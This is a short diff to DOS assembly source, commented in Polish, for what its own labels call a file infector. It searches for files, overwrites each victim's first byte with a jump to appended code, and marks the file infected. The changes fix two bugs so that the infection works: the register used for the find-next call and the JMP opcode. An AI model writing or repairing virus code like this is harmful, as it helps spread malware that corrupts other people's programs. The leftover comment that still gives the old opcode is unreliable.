@@ -43,7 +43,7 @@ plik_szukaj:
   int 21h
   jc plik_zarazanie_koniec
   call zarazanie
-  mov ax, P21H_PLIK_SZUKAJ_NASTEPNEGO
+  mov ah, P21H_PLIK_SZUKAJ_NASTEPNEGO
   jmp plik_szukaj
 plik_zarazanie_koniec:
   retn
@@ -71,7 +71,7 @@ zarazanie:
   movsw
   movsw
 ; podmiana pierwszego bajtu na instrukcję JMP, kod 9eh
-  mov [bp + bufor], byte 9eh
+  mov [bp + bufor], byte 0e9h
 ; zapisanie nowej wielkości zbioru
   mov word [bp + bufor + 1h], bx
 ; oznaczenie pliku jako zarażony
